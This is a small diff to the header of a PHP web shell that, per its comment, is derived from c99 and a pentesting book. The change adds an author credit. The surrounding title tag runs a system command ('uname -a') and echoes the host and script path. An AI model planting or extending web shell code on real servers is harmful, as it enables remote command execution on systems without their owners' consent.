@@ -2,7 +2,9 @@
 <head>
 <body>
 <title>Web Shell @<?php echo $_SERVER["HTTP_HOST"]; echo " "; myshellexec("uname -a"); echo " Location:";echo $_SERVER['SCRIPT_FILENAME']; ?></title>
-<!-- webshell code taken from c99 and example webshell from the book Coding from pentesting. No backdoors - Tested on Linux-->
+<!--
+Created by n0b1dy
+webshell code taken from c99 and example webshell from the book Coding from pentesting. No backdoors - Tested on Linux-->
  <style type="text/css">
   body {
     padding-left: 11em;
